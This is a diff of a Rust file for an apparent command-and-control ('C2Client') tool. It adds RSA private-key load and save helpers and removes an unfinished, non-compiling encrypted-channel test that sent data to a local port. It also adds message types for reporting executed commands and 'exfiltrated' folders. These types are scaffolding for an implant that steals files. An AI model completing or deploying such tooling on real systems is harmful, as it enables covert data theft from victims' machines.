@@ -38,6 +38,8 @@ use aranya_policy_vm::{
     MachineError,
     ffi::ffi
 };
+use rsa::RsaPrivateKey;
+use rsa::pkcs8::{DecodePrivateKey, EncodePrivateKey};
 use serde::{Deserialize, Serialize};
 use chrono::Utc;
 
@@ -168,7 +170,7 @@ impl<'a> C2Client<'a> {
         let policy = match parse_policy_document(policy_data) {
             Ok(v) => v,
             Err(v) => {
-                print!("Policy parsing error:\n{}\n", v.message);
+                print!("Policy parsing error:\n{}\n", v);
                 return Err(());
             }
         };
@@ -299,6 +301,18 @@ impl<'a> C2Client<'a> {
         };
     }
 
+    pub fn load_rsa_key(&self) -> RsaPrivateKey {
+        let keypath = self.config_dir.join(Path::new("rsa.key"));
+        RsaPrivateKey::read_pkcs8_pem_file(keypath)
+            .expect("Couldn't read RSA private key")
+    }
+
+    pub fn save_rsa_key(&self, rsa: &RsaPrivateKey) {
+        let keypath = self.config_dir.join(Path::new("rsa.key"));
+        rsa.write_pkcs8_pem_file(keypath, rsa::pkcs8::LineEnding::LF)
+            .expect("Couldn't write RSA private key");
+    }
+
     // Create a new Aranya graph (with an Init command) and write
     //   it to the Aranya config
     pub fn create_graph<S: Sink<VmEffect>>(
@@ -351,85 +365,20 @@ impl<'a> C2Client<'a> {
         return GraphId::decode(conf.graph_id)
             .expect("Could not decode graph ID from config");
     }
+}
 
-    // This method will set up the required structures and configurations
-    //   to open up a uni-directional channel from this Aranya instance to
-    //   the operator node. Keys must be created before this function is
-    //   called.
-    pub fn setup_fast_channel(&mut self) {
-        let keys = self.load_keys();
+#[derive(Serialize, Deserialize)]
+pub struct ExfilFolder {
+    name: String,
+    data: Vec<u8>
+}
 
-        // TODO: Get these off the graph
-        let owner_ident = IdentityKey::<DefaultCipherSuite>::new(
-            &mut self.engine
-        ).id().unwrap();
-
-        // Deterministic key generation
-        // let key = TestAeadKey::import(&[0u 8; 32]).unwrap();
-        // let (engine, key): (DefaultEngine, AeadKey) = DefaultEngine::new(key,Rng);
-
-        let enc = EncryptionKey::<DefaultCipherSuite>::new(
-            &mut self.engine
-        );
-
-        let ident_id = keys.ident_key.id().unwrap();
-
-        let channel = UniChannel {
-            // Don't care about the command id, since this is off-graph
-            parent_cmd_id: CmdId::default(),
-            // our_sk: &enc,
-            our_sk: &keys.enc_key,
-            their_pk: &keys.enc_key.public().unwrap(),
-            // seal_id: owner_ident,
-            seal_id: Id::default(),
-            // open_id: ident_id,
-            open_id: keys.ident_key.id().unwrap(),
-            // Again, no policy code so we don't care about this
-            label_id: LabelId::default()
-        };
-
-        enc
-
-        let dir = ShmPath::from_bytes(b"/afc\0").unwrap();
-        
-        let writestate: WriteState<DefaultCipherSuite, Rng>;
-        writestate = match WriteState::open(
-            dir,
-            Flag::Create, Mode::ReadWrite, 42, Rng
-        ) {
-            Ok(v) => v,
-            Err(_) => {
-                // Already exists, so just open instead of creating
-                WriteState::open(
-                    dir,
-                    Flag::OpenOnly, Mode::ReadWrite, 42, Rng
-                ).unwrap()
-            }
-        };
-
-        let readstate = AfcClient::<ReadState<DefaultCipherSuite>>::new(
-            ReadState::open(
-                dir,
-                Flag::OpenOnly, Mode::ReadWrite, 42
-            ).unwrap()
-        );
-
-        let secrets = UniSecrets::new(&mut self.engine, &channel).unwrap();
-
-        let writechannel = writestate.add(Directed::SealOnly {
-            seal: UniSealKey::from_author_secret(&channel, secrets.author).unwrap().into_raw_key()
-        }, channel.label_id, ident_id).unwrap();
-
-        let ciphertext = {
-            let mut dest = vec!(0u8; "Hello".len() + AfcClient::<ReadState<DefaultCipherSuite>>::OVERHEAD);
-            let mut ctx = readstate.setup_seal_ctx(writechannel).unwrap();
-            readstate.seal(&mut ctx, &mut dest, "Hello".as_bytes()).unwrap();
-            dest
-        };
-
-        print!("{:?}\n", ciphertext);
-
-        let mut stream = TcpStream::connect("127.0.0.1:4446").unwrap();
-        stream.write(&ciphertext);
+#[derive(Serialize, Deserialize)]
+pub enum FastChannelMessage {
+    CommandExecuted {
+        data: Vec<u8>
+    },
+    FoldersExfiltrated {
+        folders: Vec<ExfilFolder>
     }
 }
